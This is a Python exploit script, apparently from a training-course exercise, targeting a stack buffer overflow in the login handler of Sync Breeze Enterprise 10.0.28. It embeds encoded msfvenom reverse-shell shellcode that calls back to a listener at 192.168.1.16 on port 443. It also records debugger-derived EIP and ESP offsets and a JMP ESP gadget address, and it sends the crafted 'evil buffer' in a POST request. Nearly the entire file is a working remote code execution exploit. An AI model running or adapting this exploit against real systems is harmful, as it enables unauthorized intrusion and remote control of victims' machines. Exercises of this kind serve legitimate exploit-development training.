#!/usr/bin/env python3

# 3.4.9.1 Exercise - syncbreezeent_setup_v10.0.28.exe [959f770895133edc4cf65a4a02d12da8]

import socket
import struct

# target
host = "192.168.1.211"
port = 80

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=443 EXITFUNC=thread -f python -v shellcode –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
shellcode =  b""
shellcode += b"\xbe\xaf\xc7\xbf\xc6\xd9\xe1\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x0e"
shellcode += b"\x03\xdf\xc9\x5d\x33\xe3\x3e\x23\xbc\x1b\xbf"
shellcode += b"\x44\x34\xfe\x8e\x44\x22\x8b\xa1\x74\x20\xd9"
shellcode += b"\x4d\xfe\x64\xc9\xc6\x72\xa1\xfe\x6f\x38\x97"
shellcode += b"\x31\x6f\x11\xeb\x50\xf3\x68\x38\xb2\xca\xa2"
shellcode += b"\x4d\xb3\x0b\xde\xbc\xe1\xc4\x94\x13\x15\x60"
shellcode += b"\xe0\xaf\x9e\x3a\xe4\xb7\x43\x8a\x07\x99\xd2"
shellcode += b"\x80\x51\x39\xd5\x45\xea\x70\xcd\x8a\xd7\xcb"
shellcode += b"\x66\x78\xa3\xcd\xae\xb0\x4c\x61\x8f\x7c\xbf"
shellcode += b"\x7b\xc8\xbb\x20\x0e\x20\xb8\xdd\x09\xf7\xc2"
shellcode += b"\x39\x9f\xe3\x65\xc9\x07\xcf\x94\x1e\xd1\x84"
shellcode += b"\x9b\xeb\x95\xc2\xbf\xea\x7a\x79\xbb\x67\x7d"
shellcode += b"\xad\x4d\x33\x5a\x69\x15\xe7\xc3\x28\xf3\x46"
shellcode += b"\xfb\x2a\x5c\x36\x59\x21\x71\x23\xd0\x68\x1e"
shellcode += b"\x80\xd9\x92\xde\x8e\x6a\xe1\xec\x11\xc1\x6d"
shellcode += b"\x5d\xd9\xcf\x6a\xa2\xf0\xa8\xe4\x5d\xfb\xc8"
shellcode += b"\x2d\x9a\xaf\x98\x45\x0b\xd0\x72\x95\xb4\x05"
shellcode += b"\xd4\xc5\x1a\xf6\x95\xb5\xda\xa6\x7d\xdf\xd4"
shellcode += b"\x99\x9e\xe0\x3e\xb2\x35\x1b\xa9\x7d\x61\x22"
shellcode += b"\x39\x16\x70\x24\x38\x5d\xfd\xc2\x50\xb1\xa8"
shellcode += b"\x5d\xcd\x28\xf1\x15\x6c\xb4\x2f\x50\xae\x3e"
shellcode += b"\xdc\xa5\x61\xb7\xa9\xb5\x16\x37\xe4\xe7\xb1"
shellcode += b"\x48\xd2\x8f\x5e\xda\xb9\x4f\x28\xc7\x15\x18"
shellcode += b"\x7d\x39\x6c\xcc\x93\x60\xc6\xf2\x69\xf4\x21"
shellcode += b"\xb6\xb5\xc5\xac\x37\x3b\x71\x8b\x27\x85\x7a"
shellcode += b"\x97\x13\x59\x2d\x41\xcd\x1f\x87\x23\xa7\xc9"
shellcode += b"\x74\xea\x2f\x8f\xb6\x2d\x29\x90\x92\xdb\xd5"
shellcode += b"\x21\x4b\x9a\xea\x8e\x1b\x2a\x93\xf2\xbb\xd5"
shellcode += b"\x4e\xb7\xdc\x37\x5a\xc2\x74\xee\x0f\x6f\x19"
shellcode += b"\x11\xfa\xac\x24\x92\x0e\x4d\xd3\x8a\x7b\x48"
shellcode += b"\x9f\x0c\x90\x20\xb0\xf8\x96\x97\xb1\x28"

# info from debugging:
## offsets:
### ESP:
### ❯ pattern_offset.rb -q 2Ba3 -l 800
### [*] Exact match at offset 788
### EIP:
### ❯ pattern_offset.rb -q 42306142 -l 800
### [*] Exact match at offset 780

## gadgets:
### 0:009> s -b 10000000 10223000 0xFF 0xE4
### 10090c83  ff e4 0b 09 10 02 0c 09-10 24 0c 09 10 46 0c 09  .........$...F..
### 0:009> u 10090c83  
### *** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
### libspp!SCA_FileScout::GetStatusValue+0xb3:
### 10090c83 ffe4            jmp     esp


# payload:
nops        = b"\x90" * (780-len(shellcode))
eip         = struct.pack("<I", 0x10090c83)
jmp         = b"\x81\xC4\x20\xFE\xFF\xFF" + b"\xFF\xE4" # ADD ESP,-480; JMP ESP
offset1     = b"C" * 4
offset2     = b"D" * (12-len(jmp))
payload     = nops + shellcode + eip + offset1 + jmp + offset2

###
# buffer:
post_request = b"username=" + payload + b"&password=A"
buffer  = b"POST /login HTTP/1.1\r\n"
buffer += b"Host: " + host.encode() + b"\r\n"
buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
buffer += b"Content-Length: "+ str(len(post_request)).encode() + b"\r\n"
buffer += b"\r\n"
buffer += post_request

try:
    print("\nSending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buffer)
    s.close()

    print("\nDone!")

except socket.error:
    print("\nCould not connect!")

